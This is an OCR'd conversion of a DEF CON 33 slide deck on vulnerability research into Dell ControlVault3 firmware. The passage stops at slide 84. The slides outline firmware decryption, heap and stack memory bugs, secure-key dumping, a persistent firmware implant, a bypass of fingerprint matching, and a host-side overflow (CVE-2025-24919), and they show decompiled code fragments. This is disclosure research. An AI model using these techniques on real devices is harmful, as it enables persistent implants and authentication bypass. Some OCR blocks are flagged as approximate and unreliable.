---
title: "ReVault Compromised by your Secure SoC"
speakers: ["Philippe Laulheret"]
conference: "DEF CON"
conference_full: "DEF CON 33"
edition: "33"
year: 2025
source_pdf: "DEF CON 33/Philippe Laulheret - ReVault Compromised by your Secure SoC.pdf"
pages: 99
sha256: "f60223afd9d8c404d86830fceea9ce2d618c6deb43f605f7e7d0202564c4f999"
text_chars: 27555
ocr_pages: 32
has_ocr: true
redacted_secrets: 0
ocr_confidence: 81.8
ocr_unreliable_blocks: 3
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T07:12:18Z"
---
# ReVault Compromised by your Secure SoC

**Speakers:** Philippe Laulheret  
**Conference:** DEF CON 33  
**Source:** `DEF CON 33/Philippe Laulheret - ReVault Compromised by your Secure SoC.pdf` (99 pages)


## Slide 1

ReVault! Compromised by your Secure SoC

Philippe Laulheret

## Slide 2

## Philippe Laulheret

Senior Vulnerability Researcher, Cisco Talos

Focus: Windows, …

_@phLaul_

## Slide 3

What to expect from this talk

## Slide 4

## Slide 5


> Recovered by OCR — confidence 84/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
i) Audio inputs and outputs
i) Audio Processing Objects (APOs)
9 Bluetooth
@ cameras
>
>
>
@ Dell ControlVault w/o Fingerprint Sensor
= Disk drives
G Display adapters
@ Firmware
Human Interface Devices
Keyboards
LI Memory technology devices
@ Mice and other pointing devices
DS Monitors
[= Network adapters
&° Other devices
@ Ports (COM & LPT)
f=. Print queues
```

## Slide 6

## Slide 7

Controlvault?

## Slide 8

## ControlVault3 (CV) TL;DR;

- Can be found in > 100 models of Dell Laptops

   - Most of Latitude / Precision models

- Mix of Software/Firmware/Hardware

   - Windows (and Linux) APIs

   - • Firmware runs an RTOS on ARM chip

   - SoC: BCM5820x

- “Secure” Storage of secrets

- USH (Unified Secure Hub)

- Connects Fingerprint/Smart Card/NFC reader

- • ControlVault3 / ControlVault3+

- No documentation 

## Slide 9

## Finding Information Online

- Linux code compiled w/ symbols

   - <u>https://git.launchpad.net/~oem-solutionsengineers/libfprint-2-tod1broadcom/+git/libfprint-2-tod1-broadcom/</u>

- Certification document (Non-Proprietary Security Policy)

   - <u>https://csrc.nist.gov/CSRC/media/projects/ cryptographic-module</u> -validation-program/documents/security- <u>policies/140sp3920.pdf</u>

## Slide 10

Why target it?

## Slide 11


> Recovered by OCR — confidence 78/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
File Options View Process Find Users DLL Help
Process | CPU | Private Bytes | Working Set PID | Description Company Name User Name ASLR Integrity
lm’ svchost.exe 40,104 K 74404K 4220 NT AUTHORITY\SYSTEM n/a System
[i] svchost.exe 4,976 K 20,156 K 5188 Host Process for Windows Services Microsoft Corporation NT AUTHORITY\SYSTEM ASLR System
[it svchost.exe 4.012 K 21,064 K 5316 Host Process for Windows Services Microsoft Corporation NT AUTHORITY\SYSTEM ASLR System
amp spoolsv.exe 6.104 K 21,156 K 5660 Spooler SubSystem App Microsoft Corporation NT AUTHORITY\SYSTEM ASLR System
[mr svchost.exe 12,040 K 27,300 K 5908 Host Process for Windows Services Microsoft Corporation NT AUTHORITY\SYSTEM ASLR System
[it] svchost.exe 3,236 K 14,612K 5924 Host Process for Windows Services Microsoft Corporation NT AUTHORITY\SYSTEM ASLR System
[i] svchost.exe 1,652 K 8,684 K 5988 Host Process for Windows Services Microsoft Corporation NT AUTHORITY\SYSTEM ASLR System
[i] bemHost Storage Service.exe <0.01 2.528 K 10,428 K 6004 Host Storage Application Broadcom Corporation NT AUTHORITY\SYSTEM System
[ir svchost.exe 8,036 K 17,256 K 6100 Host Process for Windows Services Microsoft Corporation NT AUTHORITY\LOCAL SERVICE ASLR System
[it svchost.exe 2.112 K 10,108K 6472 Host Process for Windows Services Microsoft Corporation NT AUTHORITY\NETWORK SERVICE ASLR System
— (| DellPairService.exe 4,460 K 21,940K 6796 Dell Pair Service Dell Inc. NT AUTHORITY\SYSTEM ASLR System
1} DellPair.exe 56.036 K 51.344K 9256 Dell Pair Application Dell Inc. pl-workstation\pl ASLR Medium
— (Gj DP MSerice.exe 7,868 K 34,340 K 6804 Dell Peripheral Manager Service Dell Inc. NT AUTHORITY\SYSTEM ASLR System
DP MCrashHandler exe 1,196 K 5,872K 8928 NT AUTHORITY\SYSTEM ASLR System
j Handles “ DLLs [®) Threads
Name Description Company Name Path ASLR
advapi32 dll Advanced Windows 32 Base AP! Microsoft Corporation C:\Windows \System32\advapi32.dll ASLR
bembipdil.dil Broadcom Integrity Platform Broadcom Corporation C:\Windows \System32\bembipdll.dil
bemCVUsrifc.dil CV User Interface Broadcom Corporation C:\Windows \System32\bemCVUsrifc.dll
bemHostControlService.exe Host Control Application Broadcom Corporation C:\Windows \System32\bemHostControl Service exe
berypt.dll Windows Cryptographic Primitives Library Microsoft Corporation C:\Windows \System32\berypt. dll ASLR
beryptprimitives dll Windows Cryptographic Primitives Library Microsoft Corporation C:\Windows \System32\beryptprimitives dll ASLR
c
C_437.NLS
```

## Slide 12


> Recovered by OCR — confidence 73/100 on the text kept, 60/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
File Options View Process Find Users DLL Help
[svchost exe 4976 K NT AUTHORITY SYSTEM System
[| svchost.exe 4,012K
[it] svchost.exe 3,236 K 1.
ExibomHostStorageService exe <0.01 2,528 K 7 NT AUTHORITY’ SYSTEM System
fit) svchost.exe 8,036 K
—[@) DellPairService.exe 4,460 K
— DP MSenvice.exe 7,868 K -
j Handles “ DLLs [®) Threads
Name Description Company Name Path ASLR
advapi32 dll Advanced Windows 32 Base AP! Microsoft Corporation C:\Windows \System32\advapi32.dll ASLR
bemHostControlService.exe Host Control Application Broadcom Corporation C:\Windows \System32\bemHostControl Service exe
berypt.dll Windows Cryptographic Primitives Library Microsoft Corporation C:\Windows \System32\berypt. dll ASLR
beryptprimitives dll Windows Cryptographic Primitives Library Microsoft Corporation C:\Windows \System32\beryptprimitives dll ASLR
c
C_437.NLS
n/a
```

## Slide 13


> Recovered by OCR — confidence 75/100 on the text kept, 58/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
File Options View Process Find Users DLL Help
lal Ci|m@t|ex | | Le <Filter by name>
[| svchost.exe 4,012K i
[mr svchost.exe 12,040 K i
= DellPairService.exe 4,460 K
} Handles “© DLLs [@) Threads
Name Description Company Name Path . ASLR
advapi32.dll Advanced Windows 32 Base API Microsoft Corporation C:\Windows \System32\advapi32.dll ASLR
bembipdil.dil Broadcom Integrity Platform Broadcom Corporation C:\Windows \System32\bembipdll.dil
bemCVUsrifc.dil CV User Interface Broadcom Comoration C:\Windows \Svstem32\bemCVUsrifc.dll
C_1252.NLS 7
```

## Slide 14

## Slide 15

# Digging deeper…

(Looking at the Installer)

## Slide 16

## So Many Files!

- Drivers for USB/FP/SC/NFC

- Windows services

- Firmware Folder!

   - `bcmsbi_xxx` → SBI (Secure Boot Image), clear text

   - `bcmCitadel_xxx` → Application Firmware

      - → encrypted 

## Slide 17

System architecture


> Recovered by OCR — confidence 85/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
System architecture
NFC BOOTROM
|
| BCM
| services
USB ControlVault Hello
driver ~« Ge < adapter
|
|
i
Fingerprint
reader SPI, I2C, ... USB
SecureCard
reader
Secure
flash
Application
firmware
drivers
```

## Slide 18

## Communication with the FW

#### (Windows side)

- Driver creates a device

   - Userland opens device sends IOCTL

   - Driver sends USB packets to the firmware

- Userland dll implements high level functions:

   - `cv_open, cv_close, cv_create_object,…`

   - Most functions expects handle from `cv_open` function

- Firmware has a command handler tied to certain USB packets

   - `CvManager` / `CvManager_SBI`

   - Obvious attack surface

## Slide 19

Communication with the FW - Example

(Windows side)


> Recovered by OCR — confidence 87/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Communication with the FW -
(Windows side)
from ctypes import *
from ctypes import wintypes
import ctypes
dll = CDLL('./bcmbipd1l1-d11")
base_address = dll._handle
cv_open_address = ctypes.addressof(d1l.cv_open)
# Params are: handle (unused), dst_size, dst
# Returns: status (@ for success)
dll.cv_get_ush_ver.restype = ctypes.c_int
Example
dll.cv_get_ush ver.argtypes = [c_int, c_int, c_char p]
def cv_get_ush ver():
buffer = create string buffer(1024)
res = dll.cv_get_ush_ver(@, 1024, buffer)
blob = buffer.raw
return blob
print(cv_get_ush_ver())
```

## Slide 20

Communication with the FW - Example

(Windows side)


> Recovered by OCR — confidence 91/100 on the text kept, 64/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Communication with the FW - Example
(Windows side)
from ctypes import *
from ctypes import
import ctypes
dll = CDLL(*-/bembipd11.d11")
base address = dll. handle
17 blob = buffer.raw
19 return blob
20
22 print(cv_get_ush_ver())
23
```

## Slide 21

Threat modeling

## Slide 22

Attack Surface


> Recovered by OCR — confidence 85/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Attack Surface
NFC BOOTROM
|
| BCM
| services
USB ControlVault Hello
driver ~« Ge < adapter
|
|
i
Fingerprint
reader SPI, I2C, ... USB
SecureCard
reader
Secure
flash
Application
firmware
drivers
```

## Slide 23

Attack Surface – Secure Boot


> Recovered by OCR — confidence 87/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Attack Surface - Secure Boot
Verify
BOOTROM
| SecureCodeDesc
Update
Starts Keys
verify
l
l
l
I Application
l firmware
L
Secure boot
```

## Slide 24

## Mitigations

- Broadcom Services (Windows) • : ASLR

- • : DEP

- • : Stack cookie

- ControlVault Firmware

   - : Encrypted XIP, “Secure” Boot

   - • : ASLR, Stack Cookie

   - • : DEP

   - : RWX regions…

\```
Control
Vault
\```

## Slide 25

# Reversing time!

Importing the SBI in IDA

## Slide 26

Firmware decryption?

## Slide 27

…searching for strings…


> Recovered by OCR — confidence 77/100 on the text kept, 59/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Address
Length
0000007 D
Type
String
USH_UPGRADE: update: 5 ie failed\n
LISH_UPGRADE: complete ption failed\\n
USH UPGRADE: ption failed\n
UISH_UPGRADE: sig ption failed\,n
965: Decryption Failed - %6x \n
```

## Slide 28

FW Update / Decryption Code

Following the `USH_UPGRADE` 3-step process

- `ushFieldUpgradeStart`

   - Decrypt/Verify Firmware Header

   - If no key present, use hardcoded default

   - Generate keys for secure storage of FW

- `ushFieldUpgradeUpdate`

   - Takes chunks of data, decrypt them, keep rolling hash

   - Custom IV computation…

- `ushFieldUpgradeComplete`

   - Verify Signature

   - Commit data to flash

## Slide 29

ushFieldUpgradeStart


> Recovered by OCR — confidence 80/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ushFieldUpgradestart _
{
if ( g custid == @x6eeee@0088 )
sig offset = @;
else
sig offset = 256;
a SCD. current _key = (int)default key;
memepr(seds entry_copy, (char *)g SCD.entries, sizeof(scd_entry_copy));
scd_other_entry = &g SCD.entries[1];
activeScd = g SCD.entries;
memset((char *)g SCD.entries, @, @x1B@);
g SCD.entries[1].seqNo = 1;
g SCD.entries[1].field_@ = 6;
g SCD.upgradeScdIdx = 6;
if ( ush_decrypt(fw_blob dec, &fw_blob->first_enc_byte, fw_blob->size, (char *)g SCD.current_iv) )
{
log_stuff("USH_UPGRADE: decryption failed\n");
return 3;
```

## Slide 30

Wrapper to HW crypto module


> Recovered by OCR — confidence 79/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
1m fastcall ush decrypt(char *dst, void *data_, @At len_, char *iv)
3 int err; // r5
A) aint len; // [sp+1Ch] [bp-14h] BYREF
5
@® 6| len = len_;
@ 7| err = do_decrypt_probz( Wrapper to HW crypto module
8 UNUSED_ARG(),
9 len_,
16 (char *)data_,
11 6x16u,
12 iv,
13 UNUSED gall
14 (char
15 (unsigned ont” aT
16 dst);
@i7| if ( lerr )
@18 memcpy src_dst(dst, (char *)data_, len);
@19) return err;
```

## Slide 31

## Figuring out the Algorithm

…by trying to decrypt the Header

- AES-CBC

   - Using default key/iv

   - Some SBIs have different (wrong) keys….

- Decryption is successful when data is not random • Little/big endianness…

### AES KEY/IV

## Slide 32

Decrypt the rest

## Slide 33

Decrypting the remaining FW

See: ushFieldUpgradeUpdate


> Recovered by OCR — confidence 85/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Decrypting the remaining FW
See: ushFieldUpgradeUpdate
page number = size >> 8;
cur_page = (fw_blob *)&blob->first_enc_byte; // "page" of @x1@@ bytes (64*4)
while ( cur_page != (fw_blob *)(&blob->first_enc_byte + 128 * page number) )
{
smau_dev->api->bcm582@2 smau_get_iv(
(int)smau_dev,
+ ((cur_offset - ((unsigned int)g SCD.entries[g SCD.upgradeScdIdx].whatever_start >> 8)) << 8),
raw_iv);
swap_endinanness(raw_iv, @x1@u, iv, 1);
if ( ush_decrypt(mem_base address, cur_page, 256, iv) )
{
log stuff("USH_UPGRADE: update: decryption failed\n");
return 3;
}
```

## Slide 34

## Slide 35

Decryption Success!


> Recovered by OCR — confidence 91/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Decryption Success!
pl@pl-virtual-machine:~/re/bcm$ strings bemCitadel_1_decrypted_0x63030000.otp | grep "Broadcom"
BroadcomUSHFirmware
Broadcom ControlVault 3 w/FingerPrint
Broadcom ControlVault 3
Broadcom Corp
Broadcom USH
Broadcom NFP
pl@pl-virtual-machine:~/re/bcm$
```

## Slide 36

# Finding vulnerabilities

Hack the plAAInet

## Slide 37

## Session Handling

1. Allocate heap memory

2. Write SeSs tag

3. Return pointer as handle

Address Leak in `CV_HEAP` !


> Recovered by OCR — confidence 84/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
1
?
Session Handling
27| else
28
29 session = (cv_session *)cv_malloc(@x64u);
31 if ( !session )
32 return CV_VOLATILE_MEMORY_ALLOCATION_FAIL;
33 memset(session, @, sizeof(cv_session));
35
36
38 userIDLen = userlId_->userIDLen;
39] if ( !appId_->appIDLen && !userId_->userIDLen )
4o| {
Al memset(sess ->appUserID, ®, sizeof(sess ->appUserID));
4? |LABEL_&:
a4
A5 recurn result,
a6| }
int _ fastcall cv_open(cv_session_ flags al, cv_app_ id *appId, cv_user_id *useriId, int *pHandle)
1. Allocate heap memory
2. Write SeSs tag
3. Return pointer as handle
Address Leak in CV_HEAP!
```

## Slide 38

## Session Handling

1. Call `validate_session`


> Recovered by OCR — confidence 82/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Session Handling
int fastcall cv_close(cv_session *al)
if
if ( !validate_session(al) )
1. Call validate_session
/* special case snipped*/
if ( al < CV_HEAP || ai >= CV_HEAP + 3072 )
{
log _stuff("cv_close: invalid session handle @x#x\n", al);
else
memset(a1, 6, 4); // erase SeSs tag
return 6;
}
```

## Slide 39

## Session Handling

1. Call `validate_session` 1. Check pointer in the `CV_HEAP` 2. Check SeSs tag is present


> Recovered by OCR — confidence 83/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Session Handling
int fastcall cv_close(cv_session *al)
[ int _fastcall validate _session{cv_session *al)
i
if ( (unsigned int)al < CV_HEAP )
return CV_INVALID HANDLE;
if ( (unsigned int)al >= CV_HEAP + 3072 )
return CV_INVALID HANDLE;
f*snipped flags validation*/
return result;
}
return 6;
Call validate_session
1. Check pointer in the CV_HEAP
2. Check SeSs tag is present
```

## Slide 40

## Session Handling

1. Call `validate_session`

   1. Check pointer in the `CV_HEAP` 2. Check SeSs tag is present

2. Erase SeSs tag

3. Free pointer

Arbitrary Free in `CV_HEAP` ?

## Slide 41

## Exploitability? A few cools functions

Arbitrary data on `CV_HEAP`


> Recovered by OCR — confidence 85/100 on the text kept, 66/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Exploitability?
A few cools functions
cv_session *cv_handle,
cv_obj_ type objType,
cv_obj_attributes *pObjAttributes,
uint32_t authListsLength,
cV_ au
int (__fastcall *callbac
1s
uint8_t *objValueLength,
int context)
int status; // r3
unsigned _int8 *destData; // r®@
Arbitrary data on CV_HEAP
```

## Slide 42

## Exploitability? A few cools functions

Session Oracle


> Recovered by OCR — confidence 82/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Exploitability?
A few cools functions
Ticv_status_e fastcall cv_get_random(cv_session *al, unsigned int randLen, unsigned _int8 *pRandom)
ci cv_status_e result; // r@
result = validate_session(al);
if ( result == CV_SUCCESS )
s| if ( randlen > ex1e0 ) Session Oracle
9 return CV_INVALID_OUTPUT_PARAMETER_LENGTH;
16 else
11 return probably _gen_random(randLen, pRandom);
12
14 |}
```

## Slide 43

## Exploitability?

- Cool functions

   - `cv_create_object` → place data on the heap

   - `cv_get_object / cv_set_object` → Read/Write data from Objects

   - `cv_get_random` → locate session-looking objects

   - `cv_close` → free session-looking objects

   - Arbitrary Free in `CV_HEAP!`

## Slide 44

Heap exploitation time?

## Slide 45

Heap exploitation time?

## Slide 46

Let’s find more bugs!!!

## Slide 47

But wait, there’s more (bugs)

Stack Overflow via ObjValue?


> Recovered by OCR — confidence 75/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
But wait, there’s more (bugs)
int _ fastcall securebio_identify( 19 . int status ; f/f rv
cv_session *objS5ession, 11) cv_status_e vill; // ré
int datal, 12) int status; // ré
int a4, 14 ]; // [sp+lCh] [bp-104h] BYREF
unsigned __int® *hmacRes, 15 31// [sp+3Ch] [bp-E4h] BYREF
16 —— peeeeeeties: // [sp+5Ch] [bp-C4h] BYREF
17| char ctx[132]; // [sp+9Ch] [bp- 84h] BYREF
crypto_init((int)ctx);
memset(&objProperties, 9, sizeof(objProperties) );
objProperties.session = objSession;
Stack Overflow via ObjValue?
log _stuff("Getting object failed : securebio_identify : status = %x", wi11);
else
{
cvUpdateObjCacheLRU(objProperties.objHandle);
nencpy (data2, (unsigned __int&S *)objProperties.pObjValue, objProperties.objValueLength);// lol ?
```

## Slide 48

But wait, there’s more (bugs) `CV_CMD_FEATURE_SET_AUTHENTICATED (securebio_identify)`

- `securebio_identify` → stack-based buffer overflow ???

- • Need to control the ObjValue field

   - Can’t during object creation

   - ... Use heap corruption bug to tamper with metadata

## Slide 49

## Exploiting `securebio_identify` Nesting objects…

1. Allocate Large Object with SeSs tag

   1. Purple: attacker controlled

   2. Blue: not controlled

S
e
S
s

## Slide 50

## Exploiting `securebio_identify` Nesting objects…

1. Allocate Large Object with SeSs tag

   1. Purple: attacker controlled

   2. Blue: not controlled

2. Free fake-session inside Large Object

S
e
S
s

## Slide 51

## Exploiting `securebio_identify` Nesting objects…

1. Allocate Large Object with SeSs tag

   1. Purple: attacker controlled

   2. Blue: not controlled

2. Free fake-session inside Large Object

3. Allocate Small Object nested inside Large Object

S
e
S
s

## Slide 52

## Exploiting `securebio_identify` Nesting objects…

1. Allocate Large Object with SeSs tag

   1. Purple: attacker controlled

   2. Blue: not controlled

2. Free fake-session inside Large Object

3. Allocate Small Object nested inside Large Object

4. Tamper with Small Object fields by changing Large Object data ( `cv_set_object` )

S
e
S
s

## Slide 53

## Exploiting `securebio_identify` Nesting objects…

1. Allocate Large Object with SeSs tag

   1. Purple: attacker controlled

   2. Blue: not controlled

2. Free fake-session inside Large Object

3. Allocate Small Object nested inside Large Object

4. Tamper with Small Object fields by changing Large Object data ( `cv_set_object` )

5. Call `securebio_identify` with Small Object

\```
securebio_identify
\```

## Slide 54

## Exploiting `securebio_identify` Nesting objects…

1. Allocate Large Object with SeSs tag

   1. Purple: attacker controlled

   2. Blue: not controlled

2. Free fake-session inside Large Object

3. Allocate Small Object nested inside Large Object

4. Tamper with Small Object fields by changing Large Object data ( `cv_set_object` )

5. Call `securebio_identify` with Small Object

Stack Overflow with malicious ObjValue!

\```
securebio_identify
\```

## Slide 55

# We can execute code!

But what?

## Slide 56

The world is our 0yster

Fun things to do with code execution

- Return arbitrary data to userland:

   - Run exploit

   - Write data into our Large Object

- Read data back in userland with `cv_get_object o` Dump: RAM, Bootrom

- `o` Call `sotp_read_key` to leak Secure OTP keys

- • Patch in memory vtables/function pointers

   - Can hook/backdoor certain functions

## Slide 57

Demo

## Slide 58


> Recovered by OCR — confidence 67/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
C:\re\bcm\dev>python3 demo1_read_keys.py
```

## Slide 59

Keys?

## Slide 60

## TL;DR Key Material

- ~7 OTP (fuse) Keyslots

   - AES/HMAC per device

   - `o` Used for secure-storage (in Flash)

   - `o` Secure Code Descriptor (SCD)

- SCD Key Material (stored in Flash)

   - RSA Key for FW update signature

- AES/HMAC for XIP (regenerated each FW update)

- • Hardcoded Default Keys

   - When SCD has gone missing...

KEYS?

## Slide 61

How do you lose an SCD?

## Slide 62

## `bcm_cv_clearscd.bin`

- Used during Firmware update to reboot in SBI mode

- • Written via `cv_flash_update`

Arbitrary Flash Write


> Recovered by OCR — confidence 74/100 on the text kept, 63/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
bcm_cv_clearscd.bin
@123456789ABCDEF
3839 43. @123456789ABCDEF
3839 43 @123456789ABCDEF
3839 @123456789ABCDEF
3839 43 @123456789ABCDEF
3e39 01234567 89A8c DEF ¢ Used during Firmware update to reboot in
2839 o1234s6759ascoEF SBI mode
3839 0123456789ABCDEF
3839 @123456789ABCDEF e W i i fl h d
3839 0123456789ABCDEF ritten via cV_ as _up ate
3839 43. 0123456789ABCDEF
@123456789ABCDEF
@123456789ABCDEF
01234567894 SBI TRYING T0 BOOT
0123456789/
0123456789/
0123456789/
Arbitrary Flash Write @
```

## Slide 63

How Secure is the Boot?

## Slide 64

No signature check of Application at Boot


> Recovered by OCR — confidence 85/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Verify
BOOTROM
saa BCM 5820x Bee
No signature check of
Application at Boot *
Decrypt with OTP
<
Populate XIP
Starts
Application
firmware
SecureCodeDesc
Keys
Se Secure boot
```

## Slide 65

## Firmware modification?

- In theory we could:

   - Dump devices keys

   - Retrieve SCD content and decrypt it

   - …. Forge encrypted/HMAC blob and reflash it while code still execute

- Instead, we will:

   - Forge new SCD with custom RSA key

   - Forge a firmware update signed with our key

## Slide 66

## Success?

Nope

Watch out for the SCD endianness

## Slide 67

## Success!

Application Firmware was modified! Persist even if Windows is reinstalled!

Permanent implant


> Recovered by OCR — confidence 84/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Help
] r 1 Dell ControlVault w/ Fingerprint Touch Sensor Properties
General Versioning Driver Details Events
puts and outp
Bus reported device descnption
fault Device
Value
Application Firmware was modified!
ontrolVault | |
Persist even if Windows is reinstalled! @ es
Broadcom ControlPwN3d 3 w/FingerPnnt
nterface Devia
Permanent implant & ds
technology di
adapters
b Devices
```

## Slide 68

# UNIFIED inSECURE HUB

What happens when your secure hub is compromised…

## Slide 69

Patching `cv_fingerprint_identify` Used for Windows Hello on-device fingerprint matching

Can we make it always return True?

Hacker
HACKED
Hacker

## Slide 70

Demo

## Slide 71

## Slide 72

Further attacking Windows

## Slide 73

## Interlude: Data Encapsulation

Sending commands to the FW

- When sending a CV command, host prepares arguments:

   - Various TLV formats

   - Prepare Host → FW <u>and</u> FW → Host arguments `o` Host pre-allocates destination buffers, etc.

   - Serialize the whole thing

_Relevant CV Command is invoked_

- Upon return:

   - Deserialize the returned data

   - Copy parameters back to user

## Slide 74

## Ex. `cv_get_random`

(Host side)


> Recovered by OCR — confidence 82/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
FX. Cv_get_random
(Host side)
}
v = InitParam_List(cv_param_type_e::CV_ENCAP_INOUT_LENVAL_ PAIR, pLen, @LL, &out_param_list_entry[1]);
{
poto LABEL_20;
}
v InitParam_List(cv_param_type_e::CV_ENCAP_INOUT_LENVAL_PAIR, pLen, pRandom, in_param_list_entry);
i
{
logErrorMessage("Not copying the values to cvh_Param_List entry ", "../CVUsrLib/CVCrypt.c", "cv_get_random", 118);
else
{
if ( callback )
stCallbackCtx.callback = callback;
stCallbackCtx.context = context;
12 = cvhManageCVAPICall(2u, out_param_list_entry, lu, in_param_list_entry, &stCallbackCtx, cvHandle, @, cv_command_id_e::CV_CMD_GET_RANDOM)
pLen = 6;
inParams[1] pRandom;
vil = cvhSaveReturnValues(inParams, Ju, v12, in_param_list_entry);
```

## Slide 75

Trusting the Firmware too much… CVE-2025-24919

- Encapsulation and Size is redefined by Firmware:

- Host trusts the new serialization

Overflow & Type confusion

## Slide 76

Backdooring `cv_get_random` (Firmware Side)

- `cv_get_random` returns (size+buffer) INT on stack Buffer

Host-side Deserialization

- Backdoor the FW `cv_get_random`

   - return malicious data if a specific size is requested

   - • Treat pLen  as a buffer and overflow it with shellcode

## Slide 77

Demo

## Slide 78


> Recovered by OCR — confidence 78/100 on the text kept, 71/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
F= Command Prompt x + v fa Q x
File Edit Jump Search View Debugger Lumina Options Windows Help
a Library function a Regular function instruction Ml Data Unexplored i external symbol 1 Lumina function
A 5 unsigned int v5; // ebx
unsigned int v6; // eax
unsigned __int8 *v7; // rax
int handle; // [rsp+3@h] [rbp-18h] BYREF
|
_scrt initialize type _ir @10/] target_ize = 12; // magic value that triggers the exploit attempt
~ sert stub for acrt ui @ii| if ( arge <= 1) // if we provide any command line argument, ;
A _quard_check icall_no 42 : // the target_size value will be set to trigger the exploit.
Fa _ local stdio fof e 3 tote = 256; : // default value that will exercise normal feature
= sat a @ 15] cv_get_random = (int (__fastcall *)(i unsigned int, char *, void *, void *))GetProcAddress(
16 Library,
17 "cv_get_random”) ;
@ 18] cv_open = (int (__fastcall *)(int, char *, char *, char *, int *))GetProcAddress(Library, "“cv_open");
@ 20! cv_close partial = ( n 2d int))@x1800403A0i64;
@21!| if ( !cv_get_random )
22| £
@23 puts("Can‘t load cv_get_random. FAILED”);
@24 exit(-1);
25| }
e v5 = 0x2402BB384;
@ 28] while (1 ) // close existing session (if any)
29 // as we may have crashed before being able to release the session
30] {
a > e v6 = cv_open(4, “MyApp”, "“MyAppId”, @i64, &handle);
Line 45 of 73 @ 37! printf("cv_open status: %x\n", v6);
& Grapher a x @ 3: v7 = (unsig __int8 *)vulnerable_function(handle, target_size);
@39) if (v7)
@40 printf ("%x%x%x", *v7, v7[1], v7[2]);
@ 42) return 0;
100000577 main:19 (140001177)
3 Output
149004678: using guessed type int (__stdcall *cv_close_partial)(unsigned int);
Python
```

## Slide 79

Going beyond a custom binary

## Slide 80

## Exploiting a SYSTEM service

- Challenges:

   - High Privileges

   - Use ControlVault DLLs (no ASLR)

   - No stack-cookie (ish)

- Targets:

   - BCM services

   - Third party applications (???)

   - Windows Hello

      - Brcm{Engine|Sensor|Storage|}Adapter.dll

## Slide 81

…looking at the stack of 100+ functions…


> Recovered by OCR — confidence 82/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
looking at the stack of 100+
functions...
```

## Slide 82

BrcmStorageAdapter.dll


> Recovered by OCR — confidence 80/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
insigned int8 _ fastcall WBFUSH_ExistsCVObje@t(int cvHandle, JINORD *a2)
L
unsigned __ int8 v4; // bl
unsigned int v6; // [rsp+7@h] [rbp+18h] BYREF
__inti6é objHeader; // [rsp+78h] [rbp+20h] BYREF
log_stuff((int)L"WBFUSH_ExistsCVObject() enter\n");
if ( load_bcm() || CSS _SetupAuthorization(0i64, 0164, 0164, @i64, @i64, @i64) )
{
log_stuff((int)L"WBFUSH_ExistsCVObject() CSS_SetupAuthorization failed\n");
}
else if ( load_bcm() | CSS GetObject(cvHandle, &objHeader, &v6, 0164, &v6, 0164, &v6, OMB4) )
{
log_stuff((int)L"WBFUSH_ExistsCVObject() CSS GetObject failed\n");
}
else
{
*a2 = objHeader; // in parent function, obj_header is at offset -@x6@ in the stack
log_stuff((int)L"WBFUSH_ExistsCVObject() exit: Ox%x\n", v4);
return v4;
```

## Slide 83

BrcmStorageAdapter.dll


> Recovered by OCR — confidence 76/100 on the text kept, 65/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
L
unsigned __ int8 v4; // bl
unsigned int v6; // [rsp+7@h] [rbp+18h] BYREF
__inti6é objHeader; // [rsp+78h] [rbp+20h] BYREF
+0080880808000018 saved_rbp dq
+00808800080800020 saved_rsi dq
+00808000800000028 ReceiveBuffer dq ? } offset
+0080800000000038 ReceiveBufferSize dq ?
+0000800800000038 ReceiveDataSize dq ? } offset
+0080880080000048 OperationStatus dq ? 3 offset
+o0e0800000000048 ; end of stack variables
dup(?)
-epeeenenEeeAAE prob_objHeader fidg ? } I think it’s here or the next value...
-eBEoeBRBR0000 var_68 RecordContent ?
800058 var_5é
800038 var_38
800038 var_30
800028 var_28
880020 var_20
900018 var_18
880013
db
dq
dq
dq
db
db
dq
db
32 dup(?)
8@0022 ; end of stack variables
```

## Slide 84

## BrcmStorageAdapter.dll

- Used by WinBioSvc to implement fingerprint handling

- • IOCTL-like interface reachable from regular user:

